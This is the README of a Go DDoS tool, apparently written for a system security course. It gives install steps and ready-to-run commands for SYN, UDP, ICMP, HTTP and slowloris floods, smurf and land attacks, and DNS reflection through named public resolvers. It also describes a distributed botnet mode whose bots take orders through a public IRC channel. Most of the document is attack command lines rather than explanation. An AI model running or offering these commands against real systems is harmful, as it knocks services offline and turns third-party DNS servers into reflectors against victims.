# Cyclone Jet Rocket

Cyclone Jet Rocket is a DDoS tool for System Security Technology course.

This DDoS tool provides more than 8 kinds of attack methods, each in one module, with different parameters each module. The abstraction of Layers is inspired from [gopacket](https://github.com/google/gopacket), but reimplemented by myself.

## Install

```
go get github.com/crazyboycjr/cyclone-jet-rocket
go build -o $GOPATH/bin/cjr github.com/crazyboycjr/cyclone-jet-rocket
```

## Usage

stand-alone mode
```
cjr --help
cjr --list-module
cjr --module ping-flood help
cjr -m ping-flood --spoof 192.168.1.0/24 --destination 192.168.1.3 --rate 100/ms -c 100000
cjr -m udp-flood -s 192.168.0.0/16 -d 192.168.1.3 -p 80 -p 22 -p 8000:8000 -r nolimit
cjr -m smurf --broadcast 192.168.1.255 -d 192.168.1.3 -c 1000
cjr -m syn-flood -s 192.168.2.0/24 -d 192.168.1.3 -p 80 -r 100/s
cjr -m slowloris --url http://www.example.com --request GET -c 100 -r 1/s --timeout 10
cjr -m slowloris -u http://www.example.com -X POST -c 100 -r 10/s --t 20
cjr -m rdns --target 192.168.1.3 --dns 202.120.224.6:53 --dns 61.129.42.6:53 --dns 114.114.114.114:53 -c 1000 -r 10/s
cjr -m rdns --target 192.168.1.3 -f dns_servers.txt -c 1000 -r 10/s
cjr -m land -d 192.168.1.3 -p 80 -r 10/s
cjr -m http-flood -u http://www.example.com -X POST -c 100 -r 10/s
```

distributed mode
```
cjr --dist help
cjr -D --wait # only slave host use this command to wait for commands
cjr -D --list-bots
cjr -D -m syn-flood -s 10.0.0.0/8 -d 10.123.123.123 -p 80 -r 10/s
cjr -D --stop
cjr -D --uninstall # this command will terminate the process on slave host and remove the executable file
```

For convenience, we can also login the IRC channel to give the order. Something like below
```
irssi
/connect Freenode
/join cjr-random
!list
!module rdns --target 192.168.1.3 --dns 202.120.224.6:53 -c 1000 -r 10/s
!stop
```

## Dependencies

- Go version 1.8 or above
- [go-flags](https://github.com/jessevdk/go-flags)
- [go-ircevent](https://github.com/thoj/go-ircevent)
